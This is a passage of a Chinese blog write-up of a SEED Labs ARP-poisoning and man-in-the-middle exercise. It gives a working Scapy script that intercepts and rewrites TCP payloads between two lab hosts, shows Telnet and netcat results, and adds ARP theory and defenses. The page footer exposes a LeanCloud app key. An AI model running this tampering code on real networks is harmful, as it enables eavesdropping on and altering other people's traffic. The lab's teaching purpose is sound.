+</span></span><span class="line"><span class="cl"><span class="n">IP_A</span> <span class="o">=</span> <span class="s2">&#34;10.9.0.5&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">IP_B</span> <span class="o">=</span> <span class="s2">&#34;10.9.0.6&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">spoof_pkt</span><span class="p">(</span><span class="n">pkt</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># A -&gt; B</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pkt</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">IP_A</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span> <span class="o">==</span> <span class="n">IP_B</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">old_data</span> <span class="o">=</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span><span class="o">.</span><span class="n">load</span>
+</span></span><span class="line"><span class="cl">            <span class="n">new_data</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">rb</span><span class="s1">&#39;[a-zA-Z]&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="p">,</span> <span class="n">old_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="c1"># 构造新包并清除校验和让 Scapy 重新计算</span>
+</span></span><span class="line"><span class="cl">            <span class="n">newpkt</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">            <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">newpkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span> <span class="o">=</span> <span class="n">Raw</span><span class="p">(</span><span class="n">load</span><span class="o">=</span><span class="n">new_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">send</span><span class="p">(</span><span class="n">newpkt</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># B -&gt; A</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">pkt</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">IP_B</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span> <span class="o">==</span> <span class="n">IP_A</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">newpkt</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">send</span><span class="p">(</span><span class="n">newpkt</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;tcp and (host </span><span class="si">{</span><span class="n">IP_A</span><span class="si">}</span><span class="s1"> and host </span><span class="si">{</span><span class="n">IP_B</span><span class="si">}</span><span class="s1">)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="s1">&#39;eth0&#39;</span><span class="p">,</span> <span class="nb">filter</span><span class="o">=</span><span class="n">f</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">spoof_pkt</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过设置 store=0 杜绝内存堆积，配合 MAC 过滤防止嗅探回环死循环，并采用 1:1 字节等长替换确保 TCP 序列号对齐，彻底解决了 Scapy 脚本导致的网络卡死与连接中断</p>
+</blockquote>
+<p>最终代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">IP_A</span> <span class="o">=</span> <span class="s2">&#34;10.9.0.5&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">IP_B</span> <span class="o">=</span> <span class="s2">&#34;10.9.0.6&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 获取攻击者自身的 MAC，用于过滤</span>
+</span></span><span class="line"><span class="cl"><span class="n">MY_MAC</span> <span class="o">=</span> <span class="n">get_if_hwaddr</span><span class="p">(</span><span class="s2">&#34;eth0&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">spoof_pkt</span><span class="p">(</span><span class="n">pkt</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 排除掉攻击者自己发出的包，防止死循环</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pkt</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">MY_MAC</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># A -&gt; B </span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pkt</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">IP_A</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span> <span class="o">==</span> <span class="n">IP_B</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">newpkt</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span><span class="o">.</span><span class="n">load</span>
+</span></span><span class="line"><span class="cl">            <span class="n">newdata</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">rb</span><span class="s1">&#39;[a-zA-Z0-9]&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">newpkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span> <span class="o">=</span> <span class="n">Raw</span><span class="p">(</span><span class="n">load</span><span class="o">=</span><span class="n">newdata</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">send</span><span class="p">(</span><span class="n">newpkt</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># B -&gt; A </span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">pkt</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">IP_B</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span> <span class="o">==</span> <span class="n">IP_A</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">newpkt</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">send</span><span class="p">(</span><span class="n">newpkt</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;tcp and (host </span><span class="si">{</span><span class="n">IP_A</span><span class="si">}</span><span class="s1"> and host </span><span class="si">{</span><span class="n">IP_B</span><span class="si">}</span><span class="s1">)&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># store=0 杜绝内存卡死</span>
+</span></span><span class="line"><span class="cl"><span class="n">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="s1">&#39;eth0&#39;</span><span class="p">,</span> <span class="nb">filter</span><span class="o">=</span><span class="n">f</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">spoof_pkt</span><span class="p">,</span> <span class="n">store</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>关闭内核转发并运行脚本</p>
+<blockquote>
+<p>如果不关闭，系统会抢在你的脚本之前把包发走，篡改就失效了</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sysctl net.ipv4.ip_forward=0
+</span></span><span class="line"><span class="cl">chmod +x mitm_tcp.py
+</span></span><span class="line"><span class="cl">./mitm_tcp.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>同时运行双向投毒脚本和mitm脚本，然后主机A对B发起Telnet连接</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">telnet 10.9.0.6
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在登陆这里输入任何字符都会变成 A，说明数据在传输过程中被修改</p>
+<img src="16.png" style="width: 100%;" />
+<h2 id="任务三netcat-中间人攻击">任务三：Netcat 中间人攻击
+</h2><p>目标：精准替换字符串</p>
+<p>步骤：</p>
+<p>建立连接：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># B
+</span></span><span class="line"><span class="cl">nc -lp 9090
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># A
+</span></span><span class="line"><span class="cl">nc 10.9.0.6 9090
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>攻击者：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sysctl net.ipv4.ip_forward=1
+</span></span><span class="line"><span class="cl"># 建立连接后
+</span></span><span class="line"><span class="cl">sysctl net.ipv4.ip_forward=0
+</span></span><span class="line"><span class="cl">python3 mitm_tcp.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发送：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">seedlabs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>结果：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AAAAAAAA
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<h1 id="二arp-攻击原理">二、ARP 攻击原理
+</h1><h2 id="arp-协议原理">ARP 协议原理
+</h2><p>ARP 用于建立：
+IP地址 ↔ MAC地址 映射关系</p>
+<p>通信流程：</p>
+<ol>
+<li>广播 ARP 请求</li>
+<li>目标主机响应</li>
+<li>返回 MAC 地址</li>
+<li>写入缓存</li>
+</ol>
+<hr>
+<h2 id="arp-缓存机制">ARP 缓存机制
+</h2><p>每个主机维护缓存表</p>
+<p>特点：</p>
+<ul>
+<li>有超时（约 60–120 秒）</li>
+<li>可被更新覆盖</li>
+</ul>
+<hr>
+<h2 id="安全问题">安全问题
+</h2><p>ARP 是无状态协议</p>
+<p>任何主机收到 ARP 响应：
+→ 直接更新缓存</p>
+<p>导致：
+ARP 可被欺骗</p>
+<hr>
+<h2 id="arp-缓存中毒攻击">ARP 缓存中毒攻击
+</h2><p>原理：伪造 ARP 响应</p>
+<p>攻击过程：</p>
+<ol>
+<li>发送假 ARP</li>
+<li>受害者更新缓存</li>
+<li>流量流向攻击者</li>
+<li>实现中间人攻击</li>
+</ol>
+<hr>
+<h2 id="攻击效果">攻击效果
+</h2><ul>
+<li>窃听通信</li>
+<li>篡改数据</li>
+<li>会话劫持</li>
+<li>拒绝服务</li>
+</ul>
+<hr>
+<h2 id="防御方法">防御方法
+</h2><ul>
+<li>静态 ARP 绑定</li>
+<li>动态 ARP 检测（DAI）</li>
+<li>端口安全</li>
+<li>使用加密协议（HTTPS / SSH）</li>
+</ul>
+<hr>
+<h2 id="实验核心结论总结">实验核心结论总结
+</h2><p>ARP Request：
+可以直接创建伪造记录</p>
+<p>ARP Reply：
+只能修改已有记录</p>
+<p>MITM 成功条件：</p>
+<ul>
+<li>双向投毒</li>
+<li>控制流量路径</li>
+</ul>
+<p>TCP 篡改关键点：
+数据长度必须一致，否则连接会断开</p>
+<h2 id="参考">参考
+</h2><p><a class="link" href="https://zhuanlan.zhihu.com/p/29053435112"  target="_blank" rel="noopener"
+    >Ubuntu 24.04 安装 docker 并配置镜像源 - 知乎</a></p>
+<p><a class="link" href="https://blog.mvpbang.com/p/1e2df9d64f604d6d8e3ed1783dbdeaff/"  target="_blank" rel="noopener"
+    >docker-compose提示version告警原因 | GaGa&rsquo;s Blog</a></p>
+<p><a class="link" href="https://zhuanlan.zhihu.com/p/370507243"  target="_blank" rel="noopener"
+    >彻底搞懂系列之：ARP协议 - 知乎</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+
+        
+        <div id="viewCount">
+            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-eye"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0" /><path d="M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6" /></svg>
+            <time class="article-time--reading">
+                <span id="vercount_value_page_pv">loading... </span>次
+            </time>
+        </div>
+        
+    <style>
+         
+        #viewCount,
+        #viewCount * {
+            color: #ffffffe1 !important;
+        }
+        #viewCount {
+             position: absolute;   
+             left: 280px;            
+            transform: translateY(-50%) translateY(260px);
+        }
+    </style></footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+	const mainArticleElement = document.querySelector(".main-article");
+        renderMathInElement(mainArticleElement, {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/post/streaming/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/cover/st1.jpg" loading="lazy" data-key="" data-hash="/images/cover/st1.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Sunshine&#43;Moonlight远程串流</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/op_add/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/cover/op1.jpg" loading="lazy" data-key="" data-hash="/images/cover/op1.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">OpenWrt插件推荐与配置</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/pve_op/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/cover/op.jpg" loading="lazy" data-key="" data-hash="/images/cover/op.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">OpenWrt 在 ProxmoxVE 上的安装和基本配置</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/aio/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/cover/aio.jpg" loading="lazy" data-key="" data-hash="/images/cover/aio.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">J4125 小主机 All in One 搭建</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+        
+  <div id="like-container">
+    <img id="like-icon" src="/icons/thumb-up.svg" alt="Like" />
+    <span id="like-count">0</span>
+  </div>
+
+  <style>
+    #like-container {
+      text-align: center;
+	display: flex;
+  flex-direction: column;
+  align-items: center;
+  margin: 2rem 0;
+  margin: -3rem 0 -5rem 0rem;
+      user-select: none;
+      color: white;
+    }
+
+    #like-icon {
+      width: 33px;
+      height: 36px;
+      cursor: pointer;
+      transition: transform 0.15s ease;
+      filter: brightness(0) invert(1);
+    }
+
+    #like-icon.clicked {
+      animation: bounce 0.4s ease;
+    }
+
+    @keyframes bounce {
+      0%   { transform: scale(1); }
+      50%  { transform: scale(1.4); }
+      100% { transform: scale(1); }
+    }
+
+    #like-count {
+      display: inline-block;
+      margin-left: 0px;
+      font-size: 1.5rem; 
+    }
+  </style>
+
+  <script>
+  (function () {
+    const appId = 'QMq4HFQshcHbTkGqUoX10lDK-gzGzoHsz';
+    const appKey = 'MgjYDq8Uwr9g8x8HEJ24tyEB';
+    const serverURL = 'https://qmz4hfqs.lc-cn-n1-shared.com';
+
+    const pagePath = window.location.pathname;
+    const localKey = 'liked_' + pagePath;
+    const maxLikes = 50;
+    const headers = {
+      'X-LC-Id': appId,
+      'X-LC-Key': appKey,
+      'Content-Type': 'application/json'
+    };
+
+    async function fetchLike() {
+      const res = await fetch(`${serverURL}/1.1/classes/Like?where=` + encodeURIComponent(JSON.stringify({ path: pagePath })), { headers });
+      const data = await res.json();
+      if (data.results.length > 0) {
+        return data.results[0];
+      } else {
+        const resNew = await fetch(`${serverURL}/1.1/classes/Like`, {
+          method: 'POST',
+          headers,
+          body: JSON.stringify({
+            path: pagePath,
+            count: 0,
+            ACL: {
+              "*": {
+                "read": true,
+                "write": true
+              }
+            }
+          })
+        });
+        return await resNew.json();
+      }
+    }
+
+    async function increaseLike(objectId) {
+      await fetch(`${serverURL}/1.1/classes/Like/${objectId}`, {
+        method: 'PUT',
+        headers,
+        body: JSON.stringify({ count: { __op: 'Increment', amount: 1 } })
+      });
+    }
+
+    document.addEventListener('DOMContentLoaded', async () => {
+      const icon = document.getElementById('like-icon');
+      const count = document.getElementById('like-count');
+      const likedCount = parseInt(localStorage.getItem(localKey) || '0');
+
+      const data = await fetchLike();
+      count.textContent = data.count || 0;
+
+      icon.addEventListener('click', async () => {
+        let current = parseInt(localStorage.getItem(localKey) || '0');
+        if (current >= maxLikes) return;
+
+        icon.classList.add('clicked');
+        setTimeout(() => icon.classList.remove('clicked'), 400);
+
+        count.textContent = parseInt(count.textContent) + 1;
+        localStorage.setItem(localKey, current + 1);
+        await increaseLike(data.objectId);
+      });
+    });
+  })();
+  </script>
+
+
+
+
+
+    
+
+	
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 Thaumazein
+    </section>
+    <section class="count_info">
+  <div>
+      本站已不稳定运行
+      <span id="ds" class="running-days number-highlight"></span>
+      天
+      <span id="hs" class="running-days number-highlight"></span>
+      小时
+      <span id="ms" class="running-days number-highlight"></span>
+      分钟
+  </div>
+  <div>
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      共发表文章 
+      <span class="number-highlight">19</span> 
+      篇 ，总计 
+      <span class="number-highlight">61.29</span> 
+      k 字
+  </div>
+  <div>
+      <span id="busuanzi_container_site_pv">
+          本站总访问量：
+          <span id="busuanzi_value_site_pv" class="number-highlight"></span>
+          次
+      </span>
+  </div>
+</section>
+
+
+<script>
+let s1 = '2025-06-24'; 
+s1 = new Date(s1.replace(/-/g, "/"));
+let s2 = new Date();
+let timeDifference = s2.getTime() - s1.getTime();
+
+let days = Math.floor(timeDifference / (1000 * 60 * 60 * 24));
+let hours = Math.floor((timeDifference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+let minutes = Math.floor((timeDifference % (1000 * 60 * 60)) / (1000 * 60));
+
+
+const ds = document.getElementById('ds');
+const hs = document.getElementById('hs');
+const ms = document.getElementById('ms');
+
+ds.innerHTML = days;
+hs.innerHTML = hours;
+ms.innerHTML = minutes;
+
+
+ds.classList.add('number-highlight');
+hs.classList.add('number-highlight');
+ms.classList.add('number-highlight');
+
+
+const busuanziValue = document.getElementById('busuanzi_value_site_pv');
+if (busuanziValue) {
+    busuanziValue.classList.add('number-highlight');
+}
+</script>
+    <section class="powerby">
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+
+    </section>
+    
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
